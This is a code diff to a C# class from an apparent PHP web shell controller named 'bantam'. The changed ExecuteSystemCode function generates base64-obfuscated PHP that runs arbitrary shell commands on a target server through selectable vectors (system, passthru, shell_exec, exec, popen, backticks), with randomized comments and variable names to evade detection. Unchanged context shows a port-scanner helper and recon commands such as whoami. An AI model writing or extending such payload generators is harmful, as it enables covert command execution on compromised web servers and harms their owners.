@@ -1,4 +1,5 @@
-﻿using System.Collections.Generic;
+﻿using bantam.Forms;
+using System.Collections.Generic;
 using System.Text;
 
 namespace bantam.Classes
@@ -46,6 +47,10 @@ namespace bantam.Classes
         public const string windowsOS_NetAccounts   = "net accounts";
         public const string windowsOS_Ver           = "ver";
         public const string posixOS_Whoami          = "whoami";
+
+
+        public static string phpOb_Start = RandomPHPComment() + "@ob_start();" + RandomPHPComment();
+        public static string phpOb_End = RandomPHPComment() + "$result = @ob_get_contents(); " + RandomPHPComment() + "@ob_end_clean();" + RandomPHPComment();
 
         /// <summary>
         /// 
@@ -287,7 +292,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// Puts every possicble TCP port into the php variable $ports
+        /// Puts every possible TCP port into the php variable $ports
         /// </summary>
         /// <returns></returns>
         public static string PortScannerPortsAll()
@@ -385,6 +390,59 @@ namespace bantam.Classes
         }
 
         /// <summary>
+        /// Executes system code using the function selected in the Options form
+        /// </summary>
+        /// <param name="code"></param>
+        /// <param name="encryptResponse"></param>
+        /// <returns></returns>
+        public static string ExecuteSystemCode(string code, bool encryptResponse)
+        {
+            string result = string.Empty;
+
+            string randomvarName = RandomPHPVar();
+            string b64Code = Helper.EncodeBase64ToString(code);
+
+            if (encryptResponse) {
+                if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SYSTEM) {
+                    result = phpOb_Start + "@system(base64_decode('" + b64Code + "'));" + phpOb_End;
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.PASSTHRU) {
+                    result = phpOb_Start + "@passthru(base64_decode('" + b64Code + "'));" + phpOb_End;
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SHELL_EXEC) {
+                    result = "$result = shell_exec(base64_decode('" + b64Code + "'));";
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.EXEC) {
+                    result = "@exec(base64_decode('" + b64Code + "'), " + randomvarName + ");"
+                           + "$result = @join(PHP_EOL, " + randomvarName + ");";
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.POPEN) {
+                    result = "$result = ''; if(is_resource("+ randomvarName + " = @popen(base64_decode('" + b64Code + "'), 'r'))) {"
+                           + "while (!@feof(" + randomvarName + ")) { $result .= fread(" + randomvarName + ", 1024); }"
+                           + "pclose(" + randomvarName + ");"
+                           + "}";
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.BACKTICKS) {
+                    result = randomvarName + " = base64_decode('" + b64Code + "'); $result = `" + randomvarName + "`;";
+                }
+            } else {
+                if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SYSTEM) {
+                    result = "@system(base64_decode('" + b64Code + "'));";
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.PASSTHRU) {
+                    result = "@passthru(base64_decode('" + b64Code + "'));";
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SHELL_EXEC) {
+                    result = "echo shell_exec(base64_decode('" + b64Code + "'));";
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.EXEC) {
+                    result = "@exec(base64_decode('" + b64Code + "'), " + randomvarName + ");"
+                           + "echo @join(PHP_EOL, " + randomvarName + ");";
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.POPEN) {
+                    result = "if(is_resource(" + randomvarName + " = @popen(base64_decode('" + b64Code + "'), 'r'))) {"
+                           + "while (!@feof(" + randomvarName + ")) { echo fread(" + randomvarName + ", 1024); }"
+                           + "pclose(" + randomvarName + ");"
+                           + "}";
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.BACKTICKS) {
+                    result = "echo `base64_decode('" + b64Code + "')`";
+                }
+            }
+            return RandomPHPComment() + result + RandomPHPComment();
+        }
+
+        /// <summary>
         /// 
         /// </summary>
         /// <param name="code"></param>
@@ -393,15 +451,9 @@ namespace bantam.Classes
         public static string PhpInfo(bool encryptResponse)
         {
             if (encryptResponse) {
-                return RandomPHPComment()
-                      + "@ob_start();"
-                      + RandomPHPComment()
+                return phpOb_Start
                       + "phpinfo();"
-                      + RandomPHPComment()
-                      + "$result = @ob_get_contents();" 
-                      + RandomPHPComment()
-                      + "@ob_end_clean();"  
-                      + RandomPHPComment();
+                      + phpOb_End;
             } else {
                 return RandomPHPComment()
                        + "phpinfo();"
@@ -527,32 +579,6 @@ namespace bantam.Classes
         /// <summary>
         /// 
         /// </summary>
-        /// <param name="code"></param>
-        /// <param name="encryptResponse"></param>
-        /// <returns></returns>
-        public static string ExecuteSystemCode(string code, bool encryptResponse)
-        {
-            string b64Code = Helper.EncodeBase64ToString(code);
-            if (encryptResponse) {
-                return RandomPHPComment()
-                    + "@ob_start();" 
-                    + RandomPHPComment()
-                    + "@system(base64_decode('" + b64Code + "'));" 
-                    + RandomPHPComment()
-                    + "$result = @ob_get_contents();" 
-                    + RandomPHPComment()
-                    + "@ob_end_clean();" 
-                    + RandomPHPComment();
-            } else {
-                return RandomPHPComment() 
-                    + "@system(base64_decode('" + b64Code + "'));" 
-                    + RandomPHPComment();
-            }
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
         /// <param name="location"></param>
         /// <param name="phpVersion"></param>
         /// <returns></returns>
@@ -562,6 +588,7 @@ namespace bantam.Classes
 
             string varItem = RandomPHPVar();
             string responseCode = string.Empty;
+            string varException = RandomPHPVar();
 
             if (encryptResponse) {
                 responseCode = "$result .= ";
@@ -580,7 +607,7 @@ namespace bantam.Classes
                         + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + g_delimiter + "'."
                         + varItem + "->getPerms().'" + rowSeperator + "';",
 
-                 "}}catch(Exception $e){ }"
+                 "}}catch(Exception " + varException + "){ }"
             };
 
             foreach(var line in lines) {
